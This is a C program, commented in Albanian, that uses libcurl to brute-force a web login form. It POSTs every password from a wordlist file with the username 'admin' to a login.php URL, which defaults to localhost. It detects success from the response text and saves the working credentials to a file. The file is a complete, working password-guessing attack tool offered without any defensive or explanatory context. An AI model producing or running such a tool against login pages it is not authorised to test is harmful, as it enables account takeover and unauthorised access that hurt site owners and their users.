#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define URL "http://localhost/login.php"  // Ndrysho URL sipas rastit
#define USERNAME "admin"                  // Username që po provon
#define PASSWORD_LIST_FILE "passwords.txt" // Lista e passwordeve (një për linjë)
#define LOG_FILE "successful_login.txt"   // File ku ruhet username/password i saktë

// Buffer për të ruajtur përgjigjen e serverit
struct Memory {
    char *response;
    size_t size;
};

// Callback për të ruajtur përgjigjen e serverit
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct Memory *mem = (struct Memory *)userp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if (ptr == NULL) {
        fprintf(stderr, "Not enough memory (realloc failed)\n");
        return 0;
    }

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

// Funksioni për të provuar një login me një password të dhënë
int attemptLogin(CURL *curl, const char *username, const char *password) {
    CURLcode res;
    char postdata[256];
    struct Memory chunk = {NULL, 0};
    FILE *logfile;

    // Krijo POST data për formën e login-it
    snprintf(postdata, sizeof(postdata), "username=%s&password=%s", username, password);

    // Vendos opsionet e curl
    curl_easy_setopt(curl, CURLOPT_URL, URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postdata);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    // Ekzekuto kërkesën
    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    } else {
        // Kontrollo nëse përgjigja përmban frazën "Login successful"
        if (strstr(chunk.response, "Login successful")) {
            printf("Found password: %s\n", password);

            // Hap file për të ruajtur kredencialet e sakta
            logfile = fopen(LOG_FILE, "a");
            if (logfile == NULL) {
                perror("Failed to open log file");
                exit(1);
            }

            // Shkruaj username dhe password në file
            fprintf(logfile, "Username: %s\nPassword: %s\n\n", username, password);
            fclose(logfile);

            // Liro memorien dhe ndalo programin
            free(chunk.response);
            exit(0);
        }
    }

    // Debug: Printo passwordin e provuar
    printf("Tried password: %s\n", password);

    // Liro memorien
    free(chunk.response);
    return 0;
}

int main() {
    CURL *curl;
    FILE *password_file;
    char password[100];

    // Inicializo libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        return 1;
    }

    // Hap file-in me listën e passwordeve
    password_file = fopen(PASSWORD_LIST_FILE, "r");
    if (!password_file) {
        perror("Failed to open password list");
        return 1;
    }

    // Lexo passwordet nga lista dhe provo login
    while (fgets(password, sizeof(password), password_file)) {
        // Hiq karakterin e newline nga passwordi
        password[strcspn(password, "\n")] = '\0';

        attemptLogin(curl, USERNAME, password);
    }

    // Mbyll file-in dhe pastro curl
    fclose(password_file);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return 0;
}

